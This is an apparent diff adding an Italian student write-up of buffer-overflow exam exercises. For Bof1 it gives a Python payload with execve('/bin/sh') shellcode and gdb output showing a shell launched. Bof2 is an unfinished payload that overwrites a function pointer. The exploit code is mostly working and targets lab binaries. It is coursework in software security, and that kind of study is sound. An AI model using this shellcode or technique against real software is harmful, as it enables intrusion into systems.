@@ -1,0 +1,47 @@
+Bof1:
+il programma presenta una vulnerabilità di tipo buffer overflow, pertanto è possibile modificare l'indirizzo di ritorno della funzione echo, ad un valore a piacere, come per esempio l'indirizzo di buf1 e di conseguenza esegure il codice in esso contenuto, ovvero il nostro shellcode.
+per creare il payload è stato usato il seguente script python:
+
+import struct
+
+shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
+nop = "\x90"
+to_write=124
+buff1_address=0xbffff280 #buff1+2word 
+payload=(struct.pack("I", buff1_address))*2 #return addres is covered by the second word of the payload
+payload+=shellcode
+payload+=(struct.pack("I", buff1_address))*60 
+
+print(payload)  
+
+che genera il seguente risultato dentro gdb
+
+(gdb) r < bad
+Starting program: /home/student/Downloads/software-security-exam-master/January-2020-exam/bof-exercise/bof1 < bad
+buffer:0xbffff2b4
+buffer1:0xbffff278
+Enter some text:
+You entered: ��������1�Ph//shh/bin��PS�ᙰ
+                                        ������������������������������������1�Ph//shh/bin��PS�ᙰ
+ ������������������������������������1�Ph//shh/bin��PS�ᙰ
+                                                        ������������������������������������1�Ph//sh����n��PS�ᙰ
+                 ������������������������������������1�Ph//sh��������S�ᙰ
+                                                                        ���������������;���o������������������9���w����������������������'���6���>���P���`�������
+������6���K���d�������
+process 4994 is executing new program: /bin/dash
+[Inferior 1 (process 4994) exited normally]
+
+Bof2 (uncompleted):
+idea di base: sovrascrivere il valore di fp in modo che punti ad debugging_disable ed usare zero come come argv[1], avendo disabilitato il debug è possibile sfuttare la vulnerabilità della strcpy per sovrascrivere l'indirizzo di ritorno di print_function con quello di win:
+
+import struct
+
+fp=0xbffff354
+buf=0xbffff250
+debug=0x08049a08
+offset=fp-buf
+payload="a"*offset
+payload+=struct.pack("I", debug)
+
+print(payload)
+
